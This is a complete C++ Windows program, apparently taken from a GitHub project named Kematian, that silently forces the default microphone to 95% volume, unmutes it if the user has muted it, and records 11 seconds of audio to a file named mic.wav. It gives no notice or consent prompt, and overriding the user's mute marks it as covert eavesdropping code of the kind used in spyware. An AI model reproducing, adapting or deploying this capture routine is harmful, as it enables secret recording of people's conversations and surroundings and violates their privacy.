// https://github.com/Pirate-Devs/Kematian
#include <iostream>
#include <fstream>
#include <vector>
#include <Windows.h>
#include <mmsystem.h>
#include <Mmdeviceapi.h>
#include <Endpointvolume.h>
#include <Audioclient.h>
#include <comdef.h> 
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "Mmdevapi.lib")

const int NUM_CHANNELS = 2;              // Stereo
const int SAMPLE_RATE = 48000;           // Sample rate
const int BITS_PER_SAMPLE = 16;          // Bits per sample
const int BUFFER_DURATION_SEC = 11;      // Recording duration in seconds

void writeWAVHeader(std::ofstream& file, int numChannels, int sampleRate, int bitsPerSample, int dataSize) {
    char header[44] = {0};
    int chunkSize = dataSize + 36;
    int subChunk2Size = dataSize;
    header[0] = 'R';
    header[1] = 'I';
    header[2] = 'F';
    header[3] = 'F';
    *(int*)&header[4] = chunkSize;
    header[8] = 'W';
    header[9] = 'A';
    header[10] = 'V';
    header[11] = 'E';
    header[12] = 'f';
    header[13] = 'm';
    header[14] = 't';
    header[15] = ' ';
    *(int*)&header[16] = 16; // PCM
    *(short*)&header[20] = 1; // PCM
    *(short*)&header[22] = numChannels;
    *(int*)&header[24] = sampleRate;
    *(int*)&header[28] = sampleRate * numChannels * bitsPerSample / 8;
    *(short*)&header[32] = numChannels * bitsPerSample / 8;
    *(short*)&header[34] = bitsPerSample;
    header[36] = 'd';
    header[37] = 'a';
    header[38] = 't';
    header[39] = 'a';
    *(int*)&header[40] = subChunk2Size;
    file.write(header, 44);
}
double getTimeSeconds() {
    LARGE_INTEGER frequency, currentTime;
    QueryPerformanceFrequency(&frequency);
    QueryPerformanceCounter(&currentTime);
    return static_cast<double>(currentTime.QuadPart) / frequency.QuadPart;
}
void SetMicrophoneVolumeAndUnmute() {
    HRESULT hr = CoInitialize(nullptr);
    if (FAILED(hr)) {
        std::cerr << "[!] Failed to initialize COM" << std::endl;
        return;
    }
    IMMDeviceEnumerator *enumerator = nullptr;
    IMMDevice *microphone = nullptr;
    IAudioEndpointVolume *endpointVolume = nullptr;
    hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), nullptr, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&enumerator);
    if (FAILED(hr)) {
        std::cerr << "[!] Failed to create device enumerator" << std::endl;
        CoUninitialize();
        return;
    }
    hr = enumerator->GetDefaultAudioEndpoint(eCapture, eConsole, &microphone);
    if (FAILED(hr)) {
        std::cerr << "[!] Failed to get default audio endpoint" << std::endl;
        enumerator->Release();
        CoUninitialize();
        return;
    }
    hr = microphone->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL, nullptr, (void**)&endpointVolume);
    if (FAILED(hr)) {
        std::cerr << "[!] Failed to activate endpoint volume" << std::endl;
        microphone->Release();
        enumerator->Release();
        CoUninitialize();
        return;
    }
    hr = endpointVolume->SetMasterVolumeLevelScalar(0.95f, nullptr);
    if (FAILED(hr)) {
        std::cerr << "[!] Failed to set microphone volume" << std::endl;
    }
    BOOL isMuted = FALSE;
    hr = endpointVolume->GetMute(&isMuted);
    if (SUCCEEDED(hr) && isMuted) {
        hr = endpointVolume->SetMute(FALSE, nullptr);
        if (FAILED(hr)) {
            std::cerr << "[!] Failed to unmute the microphone" << std::endl;
        }
    }
    endpointVolume->Release();
    microphone->Release();
    enumerator->Release();
    CoUninitialize();
}

int main() {
    SetMicrophoneVolumeAndUnmute(); // only if mic is muted
    HWAVEIN hWaveIn;                    
    WAVEFORMATEX format;                 
    MMRESULT result;                     
    std::vector<BYTE> buffer;           
    std::ofstream outFile("mic.wav", std::ios::binary); 
    format.wFormatTag = WAVE_FORMAT_PCM;
    format.nChannels = NUM_CHANNELS;
    format.nSamplesPerSec = SAMPLE_RATE;
    format.wBitsPerSample = BITS_PER_SAMPLE;
    format.nBlockAlign = (format.nChannels * format.wBitsPerSample) / 8;
    format.nAvgBytesPerSec = format.nSamplesPerSec * format.nBlockAlign;
    format.cbSize = 0;
    result = waveInOpen(&hWaveIn, WAVE_MAPPER, &format, 0, 0, WAVE_FORMAT_DIRECT);
    if (result != MMSYSERR_NOERROR) {
        std::cerr << "[!] Failed to open wave input device!" << std::endl;
        return 1;
    }
    buffer.resize(format.nAvgBytesPerSec * BUFFER_DURATION_SEC);
    WAVEHDR header;
    header.lpData = reinterpret_cast<LPSTR>(&buffer[0]);
    header.dwBufferLength = buffer.size();
    header.dwBytesRecorded = 0;
    header.dwUser = 0;
    header.dwFlags = 0;
    header.dwLoops = 0;
    result = waveInPrepareHeader(hWaveIn, &header, sizeof(WAVEHDR));
    if (result != MMSYSERR_NOERROR) {
        std::cerr << "[!] Failed to prepare wave header!" << std::endl;
        waveInClose(hWaveIn);
        return 1;
    }
    result = waveInAddBuffer(hWaveIn, &header, sizeof(WAVEHDR));
    if (result != MMSYSERR_NOERROR) {
        std::cerr << "[!] Failed to add wave buffer!" << std::endl;
        waveInUnprepareHeader(hWaveIn, &header, sizeof(WAVEHDR));
        waveInClose(hWaveIn);
        return 1;
    }
    result = waveInStart(hWaveIn);
    if (result != MMSYSERR_NOERROR) {
        std::cerr << "[!] Failed to start recording!" << std::endl;
        waveInUnprepareHeader(hWaveIn, &header, sizeof(WAVEHDR));
        waveInClose(hWaveIn);
        return 1;
    }
    double startTime = getTimeSeconds();
    while (getTimeSeconds() - startTime < BUFFER_DURATION_SEC) {
    }
    result = waveInStop(hWaveIn);
    if (result != MMSYSERR_NOERROR) {
        std::cerr << "[!] Failed to stop recording!" << std::endl;
    }
    writeWAVHeader(outFile, NUM_CHANNELS, SAMPLE_RATE, BITS_PER_SAMPLE, header.dwBytesRecorded);
    outFile.write(reinterpret_cast<const char*>(&buffer[0]), header.dwBytesRecorded);
    waveInUnprepareHeader(hWaveIn, &header, sizeof(WAVEHDR));
    waveInClose(hWaveIn);
    outFile.close();
    std::cout << "[!] Recording saved to mic.wav successfully" << std::endl;
    return 0;
}
